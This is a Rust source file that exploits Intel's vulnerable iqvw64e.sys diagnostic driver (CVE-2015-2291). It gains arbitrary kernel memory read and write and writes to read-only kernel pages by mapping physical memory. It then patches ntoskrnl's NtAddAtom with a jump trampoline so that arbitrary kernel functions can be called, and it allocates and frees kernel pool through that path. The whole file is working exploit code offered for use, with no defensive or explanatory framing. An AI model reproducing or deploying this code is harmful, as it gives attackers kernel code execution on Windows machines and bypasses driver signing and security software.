//! Signed-carrier layer: arbitrary kernel-VA read/write via Intel's
//! iqvw64e.sys diagnostic driver (CVE-2015-2291). One buffered IOCTL with a
//! case-number dispatch: 0x33 copies between any two addresses (kernel or
//! user), 0x30 fills, 0x25 translates VA->PA, 0x19/0x1A map/unmap IO space.
//! No windows, no registration, no test signing.
//!
//! Device: \\.\Nal.
//! IOCTL:  0x80862007, 48-byte buffer (same in and out).
//!
//!   +0x00 case  : 0x33 copy { src@0x10 dst@0x18 len@0x20 }
//!                 0x30 fill { value@0x0C(u32) dst@0x18 len@0x20 }
//!                 0x25 getphys { in@0x18 out@0x10 }
//!                 0x19 mapphys { phys@0x20 size@0x28 -> va@0x18 }
//!                 0x1A unmaphys { va@0x18 size@0x28 }
//!   +0x08 spare
//!   +0x10 r2, +0x18 r3, +0x20 r4, +0x28 r5(u32)

use std::io;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows_sys::Win32::System::IO::DeviceIoControl;

const IOCTL: u32 = 0x8086_2007;

#[repr(C)]
#[derive(Clone, Copy, Default)]
struct Buf {
    case: u64,
    r1:   u64,
    r2:   u64,
    r3:   u64,
    r4:   u64,
    r5:   u32,
}

pub struct Rtc {
    handle: HANDLE,
    wins:   Vec<(u64, u64)>,
}

unsafe impl Send for Rtc {}

impl Drop for Rtc {
    fn drop(&mut self) {
        if !self.handle.is_null() && self.handle != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.handle) };
        }
    }
}

type FnNtAddAtom = unsafe extern "system" fn(*const u16, u32, *mut u16) -> i32;
type FnAny4      = unsafe extern "system" fn(u64, u64, u64, u64) -> i64;

impl Rtc {
    /// Open the carrier device.
    pub fn open() -> io::Result<Self> {
        let mut last = io::Error::new(io::ErrorKind::NotFound, "Nal not found");
        for name in [b"\\\\.\\Nal\0".as_ptr(), b"\\\\.\\GLOBALROOT\\Device\\Nal\0".as_ptr()] {
            let h = unsafe {
                CreateFileA(
                    name,
                    0x8000_0000 | 0x4000_0000,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    std::ptr::null(),
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    std::ptr::null_mut(),
                )
            };
            if h != INVALID_HANDLE_VALUE && !h.is_null() {
                return Ok(Rtc { handle: h, wins: Vec::new() });
            }
            last = io::Error::new(
                io::ErrorKind::NotFound,
                format!("\\\\.\\Nal open failed: err {}", unsafe { GetLastError() }),
            );
        }
        Err(last)
    }

    /// Register `[base, base+len)` as readable/writable kernel space.
    pub fn add_window(&mut self, base: u64, len: u64) {
        if len > 0 {
            self.wins.push((base, len));
        }
    }

    fn in_window(&self, addr: u64, len: usize) -> bool {
        self.wins.iter().any(|&(b, l)| addr >= b && addr + len as u64 <= b + l)
    }

    fn io(&self, b: &mut Buf) -> io::Result<()> {
        let mut ret = 0u32;
        let ok = unsafe {
            DeviceIoControl(
                self.handle, IOCTL,
                b as *const _ as *const _, std::mem::size_of::<Buf>() as u32,
                b as *mut _ as *mut _, std::mem::size_of::<Buf>() as u32,
                &mut ret, std::ptr::null_mut(),
            ) != 0
        };
        if ok { Ok(()) } else {
            Err(io::Error::new(io::ErrorKind::Other,
                format!("iqv ioctl case 0x{:X}: err {}", b.case,
                    unsafe { GetLastError() })))
        }
    }

    /// Raw copy of `data.len()` bytes between `src` and `dst` (kernel or user).
    pub fn mem_copy(&self, dst: u64, src: u64, len: usize) -> io::Result<()> {
        if len == 0 { return Ok(()); }
        let mut chunk = [0u8; 0x2000];
        let mut off = 0usize;
        while off < len {
            let n = std::cmp::min(chunk.len(), len - off);
            let mut b = Buf { case: 0x33, r2: src + off as u64, r3: dst + off as u64, r4: n as u64, ..Default::default() };
            self.io(&mut b)?;
            off += n;
        }
        Ok(())
    }

    pub fn read_memory(&self, addr: u64, out: &mut [u8]) -> io::Result<()> {
        if out.is_empty() { return Ok(()); }
        if !self.in_window(addr, out.len()) {
            return Err(io::Error::new(io::ErrorKind::AddrNotAvailable,
                format!("read 0x{:X}+{} outside allowed windows", addr, out.len())));
        }
        self.mem_copy(out.as_mut_ptr() as u64, addr, out.len())
    }

    pub fn write_memory(&self, addr: u64, data: &[u8]) -> io::Result<()> {
        if data.is_empty() { return Ok(()); }
        if !self.in_window(addr, data.len()) {
            return Err(io::Error::new(io::ErrorKind::AddrNotAvailable,
                format!("write 0x{:X}+{} outside allowed windows", addr, data.len())));
        }
        self.mem_copy(addr, data.as_ptr() as u64, data.len())
    }

    /// Kernel RO (execute) pages: translate VA->PA, map, copy, unmap.
    pub fn write_ro_memory(&self, addr: u64, data: &[u8]) -> io::Result<()> {
        let mut off = 0usize;
        while off < data.len() {
            let page_off = ((addr + off as u64) & 0xFFF) as usize;
            let n = std::cmp::min(0x1000 - page_off, data.len() - off);
            let pa = self.page_to_phys(addr + off as u64)? & !0xFFF;
            let va = self.map_io(pa, 0x1000)?;
            let r = self.mem_copy(va + page_off as u64, data.as_ptr() as u64 + off as u64, n);
            let _ = self.unmap_io(va, 0x1000);
            r?;
            off += n;
        }
        Ok(())
    }

    fn page_to_phys(&self, va: u64) -> io::Result<u64> {
        let mut b = Buf { case: 0x25, r3: va, ..Default::default() };
        self.io(&mut b)?;
        Ok(b.r2)
    }

    fn map_io(&self, phys: u64, size: u32) -> io::Result<u64> {
        let mut b = Buf { case: 0x19, r4: phys, r5: size, ..Default::default() };
        self.io(&mut b)?;
        if b.r3 == 0 {
            return Err(io::Error::new(io::ErrorKind::Other,
                format!("iqv mapphys 0x{:X} returned NULL", phys)));
        }
        Ok(b.r3)
    }

    fn unmap_io(&self, va: u64, size: u32) -> io::Result<()> {
        let mut b = Buf { case: 0x1A, r3: va, r5: size, ..Default::default() };
        self.io(&mut b)
    }

    // ── Export resolution ────────────────────────────────────────────────

    pub fn get_module_export(&self, module_base: u64, fn_name: &str) -> Option<u64> {
        let mut tmp4 = [0u8; 4];
        self.read_memory(module_base + 0x3C, &mut tmp4).ok()?;
        let e_lfanew = u32::from_le_bytes(tmp4) as u64;

        let mut sig = [0u8; 4];
        self.read_memory(module_base + e_lfanew, &mut sig).ok()?;
        if &sig != b"PE\0\0" { return None; }

        let opt = module_base + e_lfanew + 24;
        let mut dd = [0u8; 8];
        self.read_memory(opt + 0x70, &mut dd).ok()?;
        let exp_rva  = u32::from_le_bytes(dd[0..4].try_into().ok()?) as u64;
        let exp_size = u32::from_le_bytes(dd[4..8].try_into().ok()?) as u64;
        if exp_rva == 0 { return None; }

        let mut dir = [0u8; 40];
        self.read_memory(module_base + exp_rva, &mut dir).ok()?;
        let num_names = u32::from_le_bytes(dir[0x18..0x1C].try_into().ok()?) as usize;
        let names_rva = u32::from_le_bytes(dir[0x20..0x24].try_into().ok()?) as u64;
        let ords_rva  = u32::from_le_bytes(dir[0x24..0x28].try_into().ok()?) as u64;
        let funcs_rva = u32::from_le_bytes(dir[0x1C..0x20].try_into().ok()?) as u64;
        if num_names == 0 { return None; }

        let mut lo = 0usize;
        let mut hi = num_names;
        while lo < hi {
            let mid = lo + (hi - lo) / 2;

            let mut b4 = [0u8; 4];
            self.read_memory(module_base + names_rva + mid as u64 * 4, &mut b4).ok()?;
            let name_rva = u32::from_le_bytes(b4) as u64;

            let mut nb = [0u8; 64];
            let _ = self.read_memory(module_base + name_rva, &mut nb);
            let end = nb.iter().position(|&b| b == 0).unwrap_or(64);
            let cand = std::str::from_utf8(&nb[..end]).ok()?;

            match cand.cmp(fn_name) {
                std::cmp::Ordering::Equal => {
                    let mut b2 = [0u8; 2];
                    self.read_memory(module_base + ords_rva + mid as u64 * 2, &mut b2).ok()?;
                    let ord = u16::from_le_bytes(b2) as u64;
                    let mut b4b = [0u8; 4];
                    self.read_memory(module_base + funcs_rva + ord * 4, &mut b4b).ok()?;
                    let fn_rva = u32::from_le_bytes(b4b) as u64;
                    if fn_rva == 0 { return None; }
                    let fn_va = module_base + fn_rva;
                    if fn_va >= module_base + exp_rva && fn_va < module_base + exp_rva + exp_size {
                        return None;
                    }
                    return Some(fn_va);
                }
                std::cmp::Ordering::Less    => lo = mid + 1,
                std::cmp::Ordering::Greater => hi = mid,
            }
        }
        None
    }

    // ── CallKernelFunction (NtAddAtom swap) ─────────────────────────────

    pub fn kernel_call(&self, ntos_base: u64, fn_addr: u64, a0: u64, a1: u64, a2: u64, a3: u64) -> io::Result<i64> {
        let ntdll = unsafe {
            let h = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr());
            if h.is_null() { return Err(io::Error::last_os_error()); }
            windows_sys::Win32::System::LibraryLoader::GetProcAddress(h, b"NtAddAtom\0".as_ptr())
        };
        let Some(p) = ntdll else {
            return Err(io::Error::new(io::ErrorKind::NotFound, "NtAddAtom not in ntdll"));
        };
        let nt_add_atom: FnNtAddAtom = unsafe { std::mem::transmute(p) };

        static mut KERNEL_NT_ADD_ATOM: u64 = 0;
        let kernel_naa = unsafe {
            if KERNEL_NT_ADD_ATOM == 0 {
                KERNEL_NT_ADD_ATOM = self.get_module_export(ntos_base, "NtAddAtom")
                    .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound,
                        "ntoskrnl.NtAddAtom not resolved"))?;
            }
            KERNEL_NT_ADD_ATOM
        };

        let mut original = [0u8; 12];
        self.read_memory(kernel_naa, &mut original)?;
        if original[0] == 0x48 && original[1] == 0xB8 && original[10] == 0xFF && original[11] == 0xE0 {
            return Err(io::Error::new(io::ErrorKind::Other,
                "NtAddAtom already patched -- concurrent call?"));
        }

        let mut sc = [0u8; 12];
        sc[0] = 0x48; sc[1] = 0xB8;
        sc[2..10].copy_from_slice(&fn_addr.to_le_bytes());
        sc[10] = 0xFF; sc[11] = 0xE0;
        self.write_ro_memory(kernel_naa, &sc)?;

        let mut vfy = [0u8; 12];
        let _ = self.read_memory(kernel_naa, &mut vfy);
        if vfy[0] != 0x48 || vfy[1] != 0xB8 || vfy[10] != 0xFF || vfy[11] != 0xE0 {
            let _ = self.write_ro_memory(kernel_naa, &original);
            return Err(io::Error::new(io::ErrorKind::Other,
                "NtAddAtom patch did not stick -- aborting"));
        }

        let f: FnAny4 = unsafe { std::mem::transmute(nt_add_atom) };
        let r = unsafe { f(a0, a1, a2, a3) };

        let _ = self.write_ro_memory(kernel_naa, &original);
        Ok(r)
    }

    // ── Pool allocation ──────────────────────────────────────────────────

    pub fn alloc_pool(&self, ntos_base: u64, size: u64) -> io::Result<u64> {
        let tag: u64 = u32::from_le_bytes(*b"BwtE") as u64;
        let addr = if let Some(ex2) = self.get_module_export(ntos_base, "ExAllocatePool2") {
            self.kernel_call(ntos_base, ex2, 0x80, size, tag, 0)? as u64
        } else {
            let ex = self.get_module_export(ntos_base, "ExAllocatePoolWithTag")
                .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound,
                    "no ExAllocatePool2/ExAllocatePoolWithTag"))?;
            self.kernel_call(ntos_base, ex, 0, size, tag, 0)? as u64
        };
        if addr == 0 {
            return Err(io::Error::new(io::ErrorKind::OutOfMemory,
                format!("pool alloc NULL for 0x{:X}", size)));
        }
        Ok(addr)
    }

    pub fn free_pool(&self, ntos_base: u64, addr: u64) -> io::Result<()> {
        let ex = self.get_module_export(ntos_base, "ExFreePool")
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "ExFreePool not found"))?;
        self.kernel_call(ntos_base, ex, addr, 0, 0, 0)?;
        Ok(())
    }
} // impl Rtc